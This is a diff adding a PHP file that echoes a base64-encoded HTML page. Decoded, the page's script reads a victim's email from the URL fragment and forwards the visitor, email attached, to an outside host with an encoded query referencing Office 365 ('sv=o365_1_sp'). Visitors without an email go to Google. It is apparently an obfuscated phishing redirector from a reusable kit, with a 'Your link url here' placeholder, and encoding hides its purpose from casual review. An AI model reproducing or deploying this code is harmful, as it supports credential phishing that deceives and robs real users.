@@ -1,0 +1,16 @@
+<?php
+// Base64 encoded HTML string
+$base64EncodedHTML = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDx0aXRsZT5Eb2N1bWVudDwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCiAgICA8c2NyaXB0Pg0KICAgICAgIGNvbnN0IGZ1bGxVcmwgPSB3aW5kb3cubG9jYXRpb24uaHJlZjsNCiAgICAgICAgY29uc3QgZW1haWxSZWdleCA9IC8jKFteI10rKSQvOw0KICAgICAgICBjb25zdCBtYXRjaCA9IGZ1bGxVcmwubWF0Y2goZW1haWxSZWdleCk7DQogICAgICAgIGNvbnN0IGVtYWlsID0gbWF0Y2ggPyBtYXRjaFsxXSA6IG51bGw7DQogICAgICAgIHZhciBic2UgPSBhdG9iKGVtYWlsKQ0KICAgICAgICB2YXIgZW12YWwgPSBgIyR7YnNlfWA7DQoNCiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBlbWFpbCANCiAgICAgICAgICAgID8gYGh0dHBzOi8vbW9vZGxlLm15ZmluYW5jZWFkdmljZS5jb20vby8/YzNZOWJ6TTJOVjh4WDNOd0puSmhibVE5VTFWNFNsbHNiejBtZFdsa1BWVlRSVkl4TWpFeE1qQXlORlV6TXpFeE1USXdNQT09TjAxMjNOJHtlbXZhbH1gIC8vIFlvdXIgbGluayB1cmwgaGVyZQ0KICAgICAgICAgICAgOiBgaHR0cDovL2dvb2dsZS5jb21gOyANCg0KICAgIDwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg==";
+
+// Decode the Base64 string
+$decodedHTML = base64_decode($base64EncodedHTML);
+
+// Check if decoding was successful
+if ($decodedHTML === false) {
+    echo "Failed to decode Base64 HTML.";
+    exit;
+}
+
+// Render the decoded HTML in the browser
+header("Content-Type: text/html; charset=UTF-8");
+echo $decodedHTML;
